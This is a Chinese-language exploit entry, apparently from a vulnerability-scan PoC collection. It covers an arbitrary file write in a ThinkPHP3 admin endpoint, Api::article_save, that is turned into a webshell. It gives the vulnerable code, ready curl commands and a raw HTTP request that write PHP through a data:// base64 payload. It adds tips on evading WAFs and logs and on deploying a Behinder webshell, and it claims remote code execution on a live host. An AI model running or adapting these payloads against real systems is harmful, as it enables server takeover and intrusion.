# ThinkPHP3 后台 Api::article_save 任意文件写入（data:// 伪协议）→ WebShell

- **code**: thinkphp3-后台-api-article_save-任意文件写入-data-伪协议-webshell
- **kind**: exp
- **category**: file-upload
- **component**: ThinkPHP3 自研后台 Api::article_save
- **severity**: critical
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.22 实测：POST article_save ename=vsprobe&url=data://text/plain;base64,PD9waHAgZWNobyAiTUFSS0VSX09LIjsgPz4= → 200 且 cont 回显写入内容；GET /Public/www/main_r3_vsprobe.php → 200 body=MARKER_OK。用同一原语部署冰蝎马 main_r3_bkk0pmgc.php 并冰蝎协议实测 RCE 回显（php_uname → Linux target386.example.com 3.10.0-862.6.3.el7.x86_64）。
- **path**: pocs/thinkphp3-后台-api-article_save-任意文件写入-data-伪协议-webshell/poc.http
- **tags**: thinkphp,任意文件写入,data协议,getshell,rce
- **created_at**: 2026-10-13T08:43:08.050Z
- **found_by**: vuln-scan

## 描述

ThinkPHP3 后台 Api::article_save 把 $_POST['url'] 交给 file_get_contents() 再原样写入 ./Public/www/main_r3_<ename>.php，url 用 data:// 伪协议即可写任意 PHP 内容拿 WebShell（载荷在 POST body，URI 级 WAF 不可见）。

## 用法

```
# 1) 生成 b64 载荷
B64=$(printf '%s' '<?php echo "MARKER_OK"; ?>' | base64 -w0)
# 2) 写入
curl -k -s --noproxy '*' -X POST \
  -H "Host: target385.example.com" \
  -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
  -d "ename=vsprobe&url=data://text/plain;base64,$B64" \
  "https://203.0.113.22/example.com?g=Admin&m=Api&a=article_save"
# 3) 验证
curl -k -s --noproxy '*' -H "Host: target385.example.com" \
  "https://203.0.113.22/Public/www/main_r3_vsprobe.php"
需替换：Host、Cookie、ename、b64 载荷。
```

## 正文

```
## 漏洞源码
// App/Lib/Action/Admin/ApiAction.class.php
public function article_save(){
    if(IS_POST){
        $url = $_POST['url'];
        $details_arr1 = "r3_".$_POST['ename'];
        $file_path_0 = "./Public/www/www_".$details_arr1.".php";
        $file_path_1 = "./Public/www/main_".$details_arr1.".php";
        $content = file_get_contents($url);      // ← $url 完全可控
        file_put_contents($file_path_1,$content); // ← 原样写入 .php（在 str_replace 之前）
        // ... 后面 $content_yes_4 系列 str_replace 只影响 $file_path_0
    }
}

## 利用要点
- 落点固定 `./Public/www/main_r3_<ename>.php`；`main_` 那份是**原样写入**，
  而 `www_` 那份会被 str_replace 删掉换行与反斜杠（会破坏 PHP 代码），所以用 `main_`。
- `ename` 里的 `main_r3_` 前缀使 `../` 无法生效（`main_r3_..` 不是合法上级目录），路径不可穿越。
- **关键技巧**：`url` 参数用 `data://` 伪协议，载荷全在 POST body，
  URI 级 WAF / 日志看不到 payload：
    url=data://text/plain;base64,<b64(<?php ... ?>)>
  前提 allow_url_fopen=On（PHP 默认 On）。
- 需要后台会话（ApiAction extends CommonAction）。若鉴权可绕（见 Cookie 会话伪造），则无需口令。

## 复现
POST /example.com?g=Admin&m=Api&a=article_save HTTP/1.1
Host: <白名单域名>
Cookie: admin_user=the; admin_id=<password字段哈希>
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

ename=vsprobe&url=data://text/plain;base64,PD9waHAgZWNobyAiTUFSS0VSX09LIjsgPz4=

→ 200 {"form":null,"ok":1,"cont":"<?php echo \"MARKER_OK\"; ?>"}   （cont 回显证明取到内容）
→ GET /Public/www/main_r3_vsprobe.php  → 200 body=MARKER_OK       （PHP 已解析执行）

## 落地 WebShell
把 b64 换成冰蝎马即可。同目录下若出现 main_r3_*.php 别人留下的文件，
说明该写入点已被多次使用，是稳定入口。
注意 /Public/www/ 目录必须存在（不存在时目录列举返回 403，存在且无 index 时也是 403；
若返回 404 则目录不存在）。
```
